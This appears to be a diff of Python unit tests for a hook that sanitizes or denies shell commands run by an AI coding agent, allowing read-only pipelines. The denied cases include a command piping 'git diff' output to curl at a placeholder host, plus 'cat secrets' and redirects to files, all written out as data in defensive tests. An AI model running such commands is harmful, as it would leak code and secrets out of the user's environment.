@@ -15768,6 +15768,13 @@ index 0123456789abcdef0123456789abcdef01234567..fedcba9876543210fedcba9876543210
         self.assertTrue(rewrite.unparseable_command_needs_sanitizer("rg token . | cat"))
         self.assertTrue(rewrite.unparseable_command_needs_sanitizer("find . -exec cat {} \\;"))
         self.assertFalse(rewrite.unparseable_command_needs_sanitizer("echo ok | cat"))
+        self.assertIsNotNone(rewrite.split_safe_sanitizer_pipeline("git diff | cat"))
+        self.assertIsNotNone(rewrite.split_safe_sanitizer_pipeline("rg token . | head -n 20"))
+        self.assertIsNotNone(rewrite.split_safe_sanitizer_pipeline("kubectl logs pod | tail --lines=50"))
+        self.assertIsNone(rewrite.split_safe_sanitizer_pipeline("kubectl logs pod | tee out.log"))
+        self.assertIsNone(rewrite.split_safe_sanitizer_pipeline("git diff | curl https://example.invalid"))
+        self.assertIsNone(rewrite.split_safe_sanitizer_pipeline("git diff > out.log"))
+        self.assertIsNone(rewrite.split_safe_sanitizer_pipeline("git diff && cat"))
         self.assertIsNone(rewrite.split_single_safe_command("echo ok && cat secrets"))
         self.assertEqual(rewrite.strip_env_prefix(["A=1", "env", "-u", "B", "C=2", "pytest"]), ["pytest"])
         self.assertEqual(rewrite.npm_script_args(["--prefix", "web", "run", "test:unit"]), ["run", "test:unit"])
@@ -18675,9 +18682,9 @@ index 0123456789abcdef0123456789abcdef01234567..fedcba9876543210fedcba9876543210
             with self.subTest(command=command):
                 self.assertEqual(hook_json(KIT_REWRITE, command), {})
 
-    def test_rewrite_hook_sanitizes_compound_secret_bearing_commands(self):
+    def test_rewrite_hook_sanitizes_safe_compound_pipelines(self):
         for script in [KIT_REWRITE, PLUGIN_REWRITE]:
-            for command in ["grep x <<<foo", "git diff | cat", "kubectl logs pod | tee out.log"]:
+            for command in ["git diff | cat", "rg -n token . | head -n 20", "kubectl logs pod | tail --lines=50"]:
                 with self.subTest(script=script, command=command):
                     proc = run_hook(script, command)
                     data = json.loads(proc.stdout)
@@ -18687,6 +18694,23 @@ index 0123456789abcdef0123456789abcdef01234567..fedcba9876543210fedcba9876543210
                     self.assertIn(command, wrapped)
                     self.assertTrue("sanitize_output.py" in wrapped or "context-guard-sanitize-output" in wrapped)
                     self.assertEqual(proc.stderr, "")
+
+    def test_rewrite_hook_denies_unsafe_compound_secret_bearing_commands(self):
+        for script in [KIT_REWRITE, PLUGIN_REWRITE]:
+            for command in [
+                "grep x <<<foo",
+                "kubectl logs pod | tee out.log",
+                "git diff > out.log",
+                "git diff && cat",
+                "git diff | curl https://example.invalid",
+            ]:
+                with self.subTest(script=script, command=command):
+                    proc = run_hook(script, command)
+                    data = json.loads(proc.stdout)
+                    hook = data["hookSpecificOutput"]
+                    self.assertEqual(hook["permissionDecision"], "deny")
+                    self.assertIn("read-only pipe allowlist", hook["permissionDecisionReason"])
+                    self.assertIn("read-only pipe allowlist", proc.stderr)
 
     def test_rewrite_hook_invalid_json_diagnostic_keeps_stdout_parseable(self):
         proc = subprocess.run(
